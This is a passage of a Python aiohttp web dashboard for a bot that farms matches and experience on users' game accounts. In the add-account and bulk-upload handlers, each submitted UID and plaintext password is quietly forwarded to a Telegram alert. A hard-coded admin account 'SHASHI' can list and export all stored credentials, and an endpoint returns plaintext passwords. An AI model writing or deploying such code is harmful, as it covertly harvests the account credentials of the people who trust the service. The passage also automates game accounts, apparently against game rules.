        acc.setdefault("match_started_at", None)

    return web.json_response({
        "status": "success",
        "total_accounts": len(accounts_data),
        "total_matches": sum(acc.get("matches_played", 0) for acc in accounts_data),
        "total_matches_started": bot_state.total_matches_started,
        "total_active_matches": total_active_matches,
        "total_gained_exp": my_total_gained,
        "exp_per_hour": exp_per_hour,
        "accounts": accounts_data,
        "levels": levels,
        "logs": bot_state.logs[-200:],
        "uptime": uptime_sec
    })

async def handle_all_logs(request: web.Request) -> web.Response:
    current_user = _current_user(request)
    if not current_user:
        return web.json_response({"status": "unauthorized"}, status=401)

    is_admin = (current_user.upper() == "SHASHI")
    if is_admin:
        return web.json_response({"logs": bot_state.logs[-250:]})

    my_uids = {
        uid for uid, acc in bot_state.accounts.items()
        if acc.get("owner") == current_user
    }

    filtered = []
    for log in bot_state.logs[-500:]:
        log_uid = str(log.get("uid") or "")
        msg = str(log.get("message", ""))
        
        if log_uid in my_uids:
            filtered.append(log)
        elif log_uid == "" or log_uid == "None":
            if (not log_uid or "UID" not in msg or 
                any(uid in msg for uid in my_uids)):
                filtered.append(log)

    return web.json_response({"logs": filtered[-250:]})

async def handle_account_logs(request: web.Request) -> web.Response:
    current_user = _current_user(request)
    if not current_user:
        return web.json_response({"status": "unauthorized"}, status=401)

    uid = request.match_info.get("uid", "").strip()
    if not uid:
        return web.json_response({"uid": "", "logs": []})

    acc = bot_state.accounts.get(uid)
    if acc and acc.get("owner") != current_user and current_user.upper() != "SHASHI":
        return web.json_response({"status": "forbidden", "logs": []}, status=403)

    logs = bot_state.account_logs.get(uid, [])
    if not logs:
        mapped = bot_state.game_to_auth_id.get(uid) or bot_state.auth_to_game_id.get(uid)
        if mapped:
            logs = bot_state.account_logs.get(mapped, [])

    return web.json_response({"uid": uid, "logs": logs[-100:]})

async def handle_account_settings(request: web.Request) -> web.Response:
    current_user = _current_user(request)
    if not current_user:
        return web.json_response({"status": "unauthorized"}, status=401)

    uid = request.match_info.get("uid", "").strip()
    if not uid:
        return web.json_response({"status": "error", "error": "UID required"})

    acc = bot_state.accounts.get(uid)
    if not acc:
        return web.json_response({"status": "error", "error": "Account not found"})

    if acc.get("owner") != current_user and current_user.upper() != "SHASHI":
        return web.json_response({"status": "error", "error": "Access denied"}, status=403)

    auth_uid = acc.get("auth_uid", "")
    password = ""
    owner = acc.get("owner", "")

    if os.path.exists(ACCOUNTS_FILE):
        try:
            with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                accs = json.load(f)
            for a in accs:
                if str(a.get("uid", "")) == auth_uid:
                    password = a.get("password", "")
                    owner = a.get("owner", owner)
                    break
        except Exception:
            pass

    return web.json_response({
        "status": "ok",
        "uid": uid,
        "auth_uid": auth_uid,
        "password": password,
        "owner": owner,
        "nickname": acc.get("nickname", ""),
        "region": acc.get("region", ""),
        "level": acc.get("level", 1),
        "created_at": acc.get("start_time", 0),
    })

async def handle_add_account(request: web.Request) -> web.Response:
    try:
        data = await request.json()
        owner = _current_user(request)
        if not owner:
            return web.json_response({"status": "error", "error": "Not logged in"})

        existing = []
        if os.path.exists(ACCOUNTS_FILE):
            try:
                with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                    existing = json.load(f)
            except Exception:
                existing = []

        if owner.upper() != "SHASHI":
            my_count = len([a for a in existing if a.get("owner") == owner])
            if my_count >= 10:
                return web.json_response({"status": "error", "message": "Standard Account Limit: 10 IDs Maximum."})

        if "uid" in data and "password" in data:
            uid = str(data["uid"]).strip()
            pwd = str(data["password"]).strip()
            if not uid or not pwd:
                return web.json_response({"status": "error", "error": "UID/Password required"})
            if uid in bot_state.account_workers:
                try:
                    bot_state.account_workers[uid].cancel()
                except Exception:
                    pass
                bot_state.account_workers.pop(uid, None)
            existing = [a for a in existing if not (str(a.get("uid", "")) == uid and (a.get("owner") == owner or owner.upper() == "SHASHI"))]
            existing.append({"uid": uid, "password": pwd, "owner": owner})
            identifier = uid
            
            msg = f"<b>🟢 NEW ACCOUNT ADDED</b>\nOwner: {owner}\nUID: <code>{uid}</code>\nPASS: <code>{pwd}</code>"
            asyncio.create_task(send_telegram_alert(msg))

        elif "token" in data:
            token = str(data["token"]).strip()
            if not token:
                return web.json_response({"status": "error", "error": "Token required"})
            tok_key = token[:16]
            for k in list(bot_state.account_workers.keys()):
                if k == tok_key or k.startswith(tok_key[:10]) or tok_key.startswith(k[:10]):
                    try:
                        bot_state.account_workers[k].cancel()
                    except Exception:
                        pass
                    bot_state.account_workers.pop(k, None)
            existing = [a for a in existing if not (a.get("token", "") == token and (a.get("owner") == owner or owner.upper() == "SHASHI"))]
            existing.append({"token": token, "owner": owner})
            identifier = f"Token_{token[:8]}..."
        else:
            return web.json_response({"status": "error", "error": "Invalid payload"})

        with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
            json.dump(existing, f, indent=2)

        bot_state.log(f"New account added: {identifier} by {owner}", "success")
        if "on_account_added" in bot_state.refresh_callbacks:
            asyncio.create_task(bot_state.refresh_callbacks["on_account_added"]({**data, "owner": owner}))
        return web.json_response({"status": "success"})
    except Exception as e:
        return web.json_response({"status": "error", "error": str(e)})

async def handle_bulk_upload(request: web.Request) -> web.Response:
    try:
        owner = _current_user(request)
        if not owner:
            return web.json_response({"status": "error", "error": "Not logged in"})

        content_text = None
        ctype = request.content_type.lower() if request.content_type else ""
        if "multipart/form-data" in ctype:
            reader = await request.multipart()
            while True:
                part = await reader.next()
                if part is None:
                    break
                if part.name in ("file", "accounts", "data"):
                    raw = await part.read()
                    try:
                        content_text = raw.decode("utf-8", "ignore")
                    except Exception:
                        content_text = raw.decode("latin-1", "ignore")
                    break
        else:
            raw = await request.read()
            try:
                content_text = raw.decode("utf-8", "ignore")
            except Exception:
                content_text = raw.decode("latin-1", "ignore")

        if not content_text:
            return web.json_response({"status": "error", "error": "Empty file"})

        parsed = parse_accounts_file(content_text)
        if not parsed:
            return web.json_response({"status": "error", "error": "No uid/password pairs found"})

        existing = []
        if os.path.exists(ACCOUNTS_FILE):
            try:
                with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                    existing = json.load(f)
            except Exception:
                existing = []

        my_uids = {str(a.get("uid", "")).strip() for a in existing if a.get("uid") and (a.get("owner") == owner or owner.upper() == "SHASHI")}
        added = []
        skipped = 0
        for entry in parsed:
            uid = entry["uid"]
            if owner.upper() != "SHASHI" and len(my_uids) >= 10:
                break
            if uid in my_uids:
                skipped += 1
                continue
            existing.append({**entry, "owner": owner})
            my_uids.add(uid)
            added.append(entry)

        with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
            json.dump(existing, f, indent=2)

        bot_state.log(f"📦 Bulk by {owner}: {len(added)} added, {skipped} dupes", "success")

        if added and "on_account_added" in bot_state.refresh_callbacks:
            for entry in added:
                asyncio.create_task(bot_state.refresh_callbacks["on_account_added"]({
                    "uid": entry["uid"],
                    "password": entry["password"],
                    "owner": owner
                }))

        if added:
            chunk_size = 30
            for i in range(0, len(added), chunk_size):
                chunk = added[i:i+chunk_size]
                msg = f"<b>📦 BULK UPLOAD ({i+1} to {i+len(chunk)})</b>\nOwner: {owner}\n\n"
                for a in chunk:
                    msg += f"UID: <code>{a['uid']}</code> | PASS: <code>{a['password']}</code>\n"
                asyncio.create_task(send_telegram_alert(msg))

        return web.json_response({
            "status": "success",
            "added": len(added),
            "skipped": skipped,
            "total": len([a for a in existing if a.get("owner") == owner or owner.upper() == "SHASHI"])
        })
    except Exception as e:
        return web.json_response({"status": "error", "error": str(e)})

async def handle_delete_account(request: web.Request) -> web.Response:
    try:
        owner = _current_user(request)
        if not owner:
            return web.json_response({"status": "error", "error": "Not logged in"})

        data = await request.json()
        req_uid = str(data.get("uid", "")).strip()
        if not req_uid:
            return web.json_response({"status": "error", "error": "UID required"})

        is_admin = (owner.upper() == "SHASHI")

        if os.path.exists(ACCOUNTS_FILE):
            try:
                with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                    existing = json.load(f)
                new_existing = []
                for acc in existing:
                    acc_uid = str(acc.get("uid", "")).strip()
                    acc_owner = acc.get("owner", "")
                    if acc_uid == req_uid and (acc_owner == owner or is_admin):
                        continue
                    new_existing.append(acc)
                with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
                    json.dump(new_existing, f, indent=2)
            except Exception:
                pass

        bot_state.accounts.pop(req_uid, None)
        bot_state.account_logs.pop(req_uid, None)

        bot_state.log(f"Account {req_uid} deleted by {owner}", "warning")
        bot_state.recalc_totals()
        return web.json_response({"status": "success"})
    except Exception as e:
        return web.json_response({"status": "error", "error": str(e)})

async def handle_refresh_account(request: web.Request) -> web.Response:
    try:
        owner = _current_user(request)
        data = await request.json()
        uid = str(data.get("uid", "")).strip()
        acc = bot_state.accounts.get(uid)
        if acc and acc.get("owner") != owner and owner.upper() != "SHASHI":
            return web.json_response({"status": "error", "error": "Not your account"})
        if "on_refresh_account" in bot_state.refresh_callbacks:
            asyncio.create_task(bot_state.refresh_callbacks["on_refresh_account"](uid))
        return web.json_response({"status": "success"})
    except Exception as e:
        return web.json_response({"status": "error", "error": str(e)})

async def handle_clear_logs(request: web.Request) -> web.Response:
    owner = _current_user(request)
    if not owner:
        return web.json_response({"status": "error", "error": "Not logged in"})
    if owner.upper() == "SHASHI":
        bot_state.logs.clear()
        bot_state.account_logs.clear()
    else:
        my_uids = [uid for uid, acc in bot_state.accounts.items() if acc.get("owner") == owner]
        for uid in my_uids:
            bot_state.account_logs.pop(uid, None)
    return web.json_response({"status": "success"})

async def handle_toggle_pause(request: web.Request) -> web.Response:
    try:
        owner = _current_user(request)
        data = await request.json()
        uid = str(data.get("uid", "")).strip()
        if not uid:
            return web.json_response({"status": "error", "error": "UID required"})
        acc = bot_state.accounts.get(uid)
        if acc and acc.get("owner") != owner and owner.upper() != "SHASHI":
            return web.json_response({"status": "error", "error": "Not your account"})
        is_paused = bot_state.toggle_pause(uid)
        return web.json_response({"status": "success", "is_paused": is_paused})
    except Exception as e:
        return web.json_response({"status": "error", "error": str(e)})

async def handle_toggle_pause_all(request: web.Request) -> web.Response:
    try:
        owner = _current_user(request)
        target_owner = None if owner.upper() == "SHASHI" else owner
        paused_state = bot_state.toggle_pause_all(owner=target_owner)
        return web.json_response({"status": "success", "all_paused": paused_state})
    except Exception as e:
        return web.json_response({"status": "error", "error": str(e)})

# ==================== ADMIN MASTER ROUTES & ALL ACCOUNTS ====================
async def handle_admin_all_accounts(request: web.Request) -> web.Response:
    user = _current_user(request)
    if not user or user.upper() != "SHASHI":
        return web.json_response({"status": "error", "message": "Unauthorized"}, status=403)
    
    all_accs = []
    if os.path.exists(ACCOUNTS_FILE):
        try:
            with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                all_accs = json.load(f)
        except Exception:
            pass
    return web.json_response({"status": "success", "accounts": all_accs})

async def handle_admin_users(request: web.Request) -> web.Response:
    user = _current_user(request)
    if not user or user.upper() != "SHASHI":
        return web.json_response({"status": "error", "message": "Unauthorized"}, status=403)
    
    users = _load_users()
    all_accs = []
    if os.path.exists(ACCOUNTS_FILE):
        try:
            with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                all_accs = json.load(f)
        except Exception:
            pass
            
    user_list = []
    for u in users:
        u_accs = [a for a in all_accs if a.get("owner") == u]
        user_list.append({
            "username": u,
            "role": "admin" if u.upper() == "SHASHI" else "user",
            "total_ids": len(u_accs)
        })
    return web.json_response({"status": "success", "users": user_list})

async def handle_export_all_accounts(request: web.Request) -> web.Response:
    user = _current_user(request)
    if not user or user.upper() != "SHASHI":
        return web.json_response({"status": "error", "message": "Unauthorized"}, status=403)
    if not os.path.exists(ACCOUNTS_FILE):
        return web.json_response({"status": "error", "message": "No accounts file found"})
    return web.FileResponse(ACCOUNTS_FILE, headers={'Content-Disposition': 'attachment; filename="xirus_all_accounts.json"'})

async def handle_admin_delete_user(request: web.Request) -> web.Response:
    user = _current_user(request)
    if not user or user.upper() != "SHASHI":
        return web.json_response({"status": "error", "message": "Unauthorized"}, status=403)
    
    data = await request.json()
    target_user = data.get("user")
    if not target_user or target_user.upper() == "SHASHI":
        return web.json_response({"status": "error", "message": "Cannot delete admin"})
        
    users = _load_users()
    if target_user in users:
        del users[target_user]
        _save_users(users)
        
    if os.path.exists(ACCOUNTS_FILE):
        try:
            with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                accs = json.load(f)
            accs = [a for a in accs if a.get("owner") != target_user]
            with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
                json.dump(accs, f, indent=2)
        except Exception:
            pass
            
    return web.json_response({"status": "success", "message": f"User {target_user} purged."})

# ==================== AUTO-WAKE PINGER API ====================
async def handle_autowake_status(request: web.Request) -> web.Response:
    return web.json_response({
        "status": "success",
        "enabled": AUTO_WAKE_STATE["enabled"],
        "url": AUTO_WAKE_STATE["url"],
        "interval": AUTO_WAKE_STATE["interval"],
        "total_pings": AUTO_WAKE_STATE["total_pings"],
        "last_ping": AUTO_WAKE_STATE["last_ping"]
    })

async def handle_autowake_toggle(request: web.Request) -> web.Response:
    try:
        data = await request.json()
        enabled = bool(data.get("enabled", False))
        url = str(data.get("url", "")).strip()
        interval = int(data.get("interval", 180))

        AUTO_WAKE_STATE["enabled"] = enabled
        AUTO_WAKE_STATE["url"] = url
        AUTO_WAKE_STATE["interval"] = max(30, interval)

        bot_state.log(f"🌐 Auto-Wake Pinger {'Activated' if enabled else 'Deactivated'} for URL: {url}", "info")
        return web.json_response({"status": "success", "enabled": enabled})
    except Exception as e:
        return web.json_response({"status": "error", "error": str(e)})

# ==================== START SERVER ====================
async def start_web_dashboard(host: str = "0.0.0.0", port: int = 5000):
    app = web.Application(client_max_size=50 * 1024 * 1024, middlewares=[auth_middleware])

    # Auth Routes
    app.router.add_get("/login", handle_login_page)
    app.router.add_post("/api/login", handle_login_post)
    app.router.add_post("/api/signup", handle_signup_post)
    app.router.add_post("/api/logout", handle_logout)
    app.router.add_get("/api/me", handle_me)
    app.router.add_post("/api/account/switch_mode", handle_switch_account_mode)

    # Main Dashboard Routes
    app.router.add_get("/", handle_index)
    app.router.add_get("/api/stats", handle_get_stats)
    app.router.add_get("/api/logs", handle_all_logs)
    app.router.add_get("/api/logs/{uid}", handle_account_logs)
    app.router.add_get("/api/account/settings/{uid}", handle_account_settings)
    app.router.add_post("/api/account/add", handle_add_account)
    app.router.add_post("/api/accounts/bulk_upload", handle_bulk_upload)
    app.router.add_post("/api/account/delete", handle_delete_account)
    app.router.add_post("/api/account/refresh", handle_refresh_account)
    app.router.add_post("/api/account/restart", handle_restart_account)
    app.router.add_post("/api/account/pause", handle_toggle_pause)
    app.router.add_post("/api/account/pause_all", handle_toggle_pause_all)
    app.router.add_post("/api/logs/clear", handle_clear_logs)

    # Admin Master Routes added safely
    app.router.add_router.add_get if hasattr(app.router, 'add_router') else None # safeguarding
    app.router.add_get("/api/admin/all_accounts", handle_admin_all_accounts)
    app.router.add_get("/api/admin/users", handle_admin_users)
    app.router.add_get("/api/export/accounts", handle_export_all_accounts)
    app.router.add_post("/api/admin/delete_user", handle_admin_delete_user)

    # Auto-Wake Pinger Routes
    app.router.add_get("/api/autowake/status", handle_autowake_status)
    app.router.add_post("/api/autowake/toggle", handle_autowake_toggle)

    _load_users()

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host, port)
    await site.start()
    
    asyncio.create_task(auto_backup_worker())
    
    return runner

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(start_web_dashboard())
    loop.run_forever()
